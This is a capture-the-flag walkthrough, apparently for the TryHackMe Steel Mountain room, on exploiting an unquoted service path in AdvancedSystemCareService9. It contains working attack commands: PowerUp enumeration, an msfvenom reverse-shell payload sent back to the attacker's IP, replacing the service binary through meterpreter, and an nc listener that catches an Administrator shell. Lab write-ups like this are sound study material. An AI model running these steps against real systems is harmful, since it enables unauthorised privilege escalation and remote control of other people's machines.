# Unquoted Service Path

{% embed url="https://systemweakness.com/steel-mountain-tryhackme-walkthrough-552021de9159" %}

```
meterpreter > powershell_shellPS > . .\PowerUp.ps1PS > Invoke-Allchecks
```

This will run our scripts and after that, we will analyze our results and we get a process with Restartable permission in our results with a service named **AdvancedSystemCareService9.**

> 2\. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an _unquoted service path_ vulnerability?

### Enumerate Permissions on the Binary

```
 powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

```

Ans : **AdvancedSystemCareService9**

Now as we found our service we will now generate a payload for exploiting our target using msfvenom on our machine and then uploading it to our target.

```
msfvenom -p windows/shell_reverse_tcp LHOST=[Your_Local_IP] LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

Now let’s move back to our meterpreter shell and do the following process:

```
meterpreter > shell# to stop the serviceC:\Users\bill\Desktop> sc stop AdvancedSystemCareService9# press ctrl+C to exit the processmeterpreter > upload ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"# the path above is the path of the service and we are replacing it with our malicious payload (always check the path of the file to be same as your metasploit path in which it is running)
```

Let’s start a Netcat listener in another tab of our terminal

```
nc -lvnp 4443
```

Let’s move back to the shell and start our service again and here comes the juice 🧃

```
meterpreter > shellC:\Users\bill\Desktop> sc start AdvancedSystemCareService9
```

Congratulations!! we have our Administrator shell in our Netcat listener
